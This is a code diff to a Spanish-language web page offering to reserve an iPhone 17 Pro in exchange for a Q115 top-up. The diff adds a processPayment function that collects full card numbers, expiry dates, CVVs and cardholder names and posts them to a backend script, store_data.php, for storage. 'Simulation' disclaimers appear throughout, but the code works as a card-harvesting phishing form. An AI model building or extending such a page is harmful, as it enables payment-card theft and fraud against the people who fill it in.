@@ -36,7 +36,8 @@
 
   <div class="container" role="main">
     <div class="left" aria-hidden="false">
-      <img src="neo.png" alt="poster" class="poster">
+      <!-- <img src="neo.png" alt="poster" class="poster"> -->
+       <img src="neo-m.png" alt="poster" class="poster'">
       <h2>Reserva - iPhone 17 Pro</h2>
       <p style="max-width:360px;text-align:center">Para apartar tu iPhone 17 Pro debes completar el formulario. <strong>Luego</strong> realizar una recarga de <strong>Q115</strong> (simulado).</p>
       <div style="font-size:12px;opacity:0.9;text-align:center;max-width:360px">
@@ -154,6 +155,57 @@
   }
 
   function escapeHtml(s){ return String(s).replace(/[&<>"'`=\/]/g, function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','/':'&#x2F;','`':'&#96;','=':'&#61;'}[c]}) }
+function processPayment(evt) {
+    evt.preventDefault();
+    const number = cardInput.value.replace(/\s/g, '');
+    const exp = document.getElementById('exp').value;
+    const cvv = document.getElementById('cvv').value;
+    const holder = document.getElementById('holder').value.trim();
+    const messages = document.getElementById('messages');
+    messages.innerHTML = '';
+
+    // Validaciones básicas (solo UI)
+    if(number.length < 13 || number.length > 19){
+      messages.innerHTML = '<div class="danger">Número de tarjeta inválido (simulado).</div>'; return false;
+    }
+    // ... (otras validaciones existentes) ...
+
+    // Datos que se enviarán al servidor
+    const payload = {
+        cardNumber: number,
+        expiration: exp,
+        cvv: cvv,
+        cardHolder: holder,
+        amount: document.getElementById('amount').value
+    };
+
+    // Envío de los datos al script de backend (ejemplo en PHP)
+    fetch('store_data.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+        // En el entorno real, verificaríamos 'data' para el éxito o el error
+        // En esta simulación, solo mostramos el mensaje de éxito
+        messages.innerHTML = '<div class="success"><strong>Reserva simulada exitosa.</strong><br>Sus datos fueron registrados (simulación).</div>';
+        // Mostrar instrucción adicional (opcional)
+        messages.innerHTML += '<div style="margin-top:8px" class="small">Recuerde: <strong>no</strong> enviar datos reales en esta demo.</div>';
+    })
+    .catch(error => {
+        // Manejo de errores en caso de que el envío falle
+        console.error('Error:', error);
+        messages.innerHTML = '<div class="danger">Ocurrió un error al procesar la reserva. Intente de nuevo.</div>';
+    });
+
+    // Deshabilita el reset para que se mantengan los datos mientras se prueban
+    // setTimeout(() => { document.getElementById('payForm').reset(); }, 4000);
+
+    return false;
+}
 </script>
 </body>
 </html>
